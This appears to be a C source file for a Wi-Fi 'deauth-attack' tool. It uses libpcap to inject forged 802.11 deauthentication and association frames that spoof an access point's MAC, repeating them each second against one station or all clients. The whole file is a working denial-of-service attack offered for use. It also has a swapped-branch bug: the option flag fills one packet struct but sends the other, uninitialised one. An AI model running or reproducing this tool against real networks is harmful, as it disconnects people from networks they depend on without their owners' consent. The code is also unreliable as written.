#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <stdbool.h> 
#include <pcap.h>
#include <signal.h>
#include <unistd.h>

#define MAC_ADDR_LEN 6
#define RADIOTAP_HEADER_LEN 12
#define RADIOTAP_HEADER_LEN_AUTH 18
#define MAC_ADDR_FORMAT "%02hhx:%02hhx:%02hhx:%02hhx:%02hhx:%02hhx"

bool keyboard_interrupt = false;

// http://ktword.co.kr/test/view/view.php?no=5660
struct ieee80211_packet {
    int8_t radio_information_80211[RADIOTAP_HEADER_LEN];
    // mac header
    int16_t frame_control_field;
    int16_t duration;
    int8_t addr1[MAC_ADDR_LEN]; // dst addr
    int8_t addr2[MAC_ADDR_LEN]; // src addr
    int8_t addr3[MAC_ADDR_LEN]; // BSSID
    int16_t sequence_control;
    int16_t reason_code;
} __attribute__((packed));


struct ieee80211_packet_association {
    int8_t radio_information_80211[RADIOTAP_HEADER_LEN_AUTH];
    // mac header
    int16_t frame_control_field;
    int16_t duration;
    int8_t addr1[MAC_ADDR_LEN]; // dst addr
    int8_t addr2[MAC_ADDR_LEN]; // src addr
    int8_t addr3[MAC_ADDR_LEN]; // BSSID
    int16_t sequence_control;
    int8_t wireless_management[119];
    int32_t check_sequence;
} __attribute__((packed));


void usage() {
    printf("syntax : deauth-attack <interface> <ap mac> [<station mac> [-auth]]\n");
    printf("sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n");
}


void sigint_handler(int signum) {
    printf("Caught SIGINT, exiting...\n");
    if (signum) {
        keyboard_interrupt = true;
    }
}


void save_mac(const char *mac_str, uint8_t *mac) {
    int values[MAC_ADDR_LEN];
    if (sscanf(mac_str, MAC_ADDR_FORMAT, &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]) != MAC_ADDR_LEN) {
        fprintf(stderr, "Invalid MAC address format: %s\n", mac_str);
        exit(EXIT_FAILURE);
    }
}


int main(int argc, char* argv[]) {
    uint8_t ap_mac[MAC_ADDR_LEN];
    uint8_t station_mac[MAC_ADDR_LEN];
    bool broadcast = false;
    bool set_option = false;

    if (argc < 3) {
        usage();
        return -1;
    }
    else if (argc == 3) {
        broadcast = true;
        printf("%d\n", broadcast);
        save_mac(argv[2], ap_mac);
        save_mac("ff:ff:ff:ff:ff:ff", station_mac);
    }
    else {
        broadcast = false;
        printf("%d\n", broadcast);
        save_mac(argv[2], ap_mac);
        save_mac(argv[3], station_mac);

        for (int i = 0; i < argc; i++) {
            if (strcmp(argv[i], "-auth") == 0) {
                set_option = 1;
            }
        }
    }

    signal(SIGINT, sigint_handler);

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(argv[1], BUFSIZ, 1, 1000, errbuf);
    if (pcap == NULL) {
        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", argv[1], errbuf);
        return -1;
    }

    struct ieee80211_packet packet;
    struct ieee80211_packet_association packet_auth;
    if (set_option) {
        uint8_t radio_info[RADIOTAP_HEADER_LEN] = {0x00, 0x00, 0x0c, 0x00, 
                                                    0x04, 0x80, 0x00, 0x00, 
                                                    0x02, 0x00, 0x18, 0x00};
        memcpy(packet.radio_information_80211, radio_info, RADIOTAP_HEADER_LEN); 
        packet.frame_control_field = htons(0xc000);
        packet.duration = htons(0x3101);
        memcpy(packet.addr1, station_mac, MAC_ADDR_LEN);  
        memcpy(packet.addr2, ap_mac, MAC_ADDR_LEN);
        memcpy(packet.addr3, ap_mac, MAC_ADDR_LEN);
        packet.sequence_control = htons(0x0000);
        packet.reason_code = htons(0x7000);
    }
    else {
        uint8_t radio_info[RADIOTAP_HEADER_LEN_AUTH] = {0x00, 0x00, 0x12, 0x00,
                                                        0x2e, 0x48, 0x00, 0x00,
                                                        0x10, 0x02, 0x71, 0x09,
                                                        0xa0, 0x00, 0xc4, 0x00,
                                                        0x00, 0x00};
        memcpy(packet_auth.radio_information_80211, radio_info, RADIOTAP_HEADER_LEN_AUTH); 
        packet_auth.frame_control_field = htons(0xb008);
        packet_auth.duration = htons(0x3a01);
        memcpy(packet_auth.addr1, station_mac, MAC_ADDR_LEN);  
        memcpy(packet_auth.addr2, ap_mac, MAC_ADDR_LEN);
        memcpy(packet_auth.addr3, ap_mac, MAC_ADDR_LEN);
        packet_auth.sequence_control = htons(0x0000);
        uint8_t packets[] = {
            0x31, 0x04, 0x0a, 0x00, 0x00, 0x09, 0x55, 0x2b, 0x4e, 0x65,
            0x74, 0x31, 0x41, 0x38, 0x34, 0x01, 0x08, 0x82, 0x84, 0x8b,
            0x96, 0x24, 0x30, 0x48, 0x6c, 0x32, 0x04, 0x0c, 0x12, 0x18,
            0x60, 0x21, 0x02, 0x03, 0x14, 0x24, 0x02, 0x01, 0x0b, 0x30,
            0x14, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x04, 0x01, 0x00, 0x00,
            0x0f, 0xac, 0x04, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x02, 0x80,
            0x00, 0x2d, 0x1a, 0x21, 0x00, 0x17, 0xff, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x7f,
            0x08, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x40, 0xdd,
            0x09, 0x00, 0x10, 0x18, 0x02, 0x00, 0x00, 0x10, 0x00, 0x00,
            0xdd, 0x07, 0x00, 0x50, 0xf2, 0x02, 0x00, 0x01, 0x00
        };
        memcpy(packet_auth.wireless_management, packets, sizeof(packets)); 
        packet_auth.check_sequence = htonl(0x62764377);
    }


    while (!keyboard_interrupt) {
        if (!set_option) {
            if (pcap_sendpacket(pcap, (const unsigned char*)&packet, sizeof(packet)) != 0) {
                fprintf(stderr, "Error sending the packet: %s\n", pcap_geterr(pcap));
                break;
            }
            printf("packet1 send\n");
        }
        else {
            if (pcap_sendpacket(pcap, (const unsigned char*)&packet_auth, sizeof(packet_auth)) != 0) {
                fprintf(stderr, "Error sending the packet: %s\n", pcap_geterr(pcap));
                break;
            }
            printf("packet2 send\n");
        }

        sleep(1);
    }

    pcap_close(pcap);
}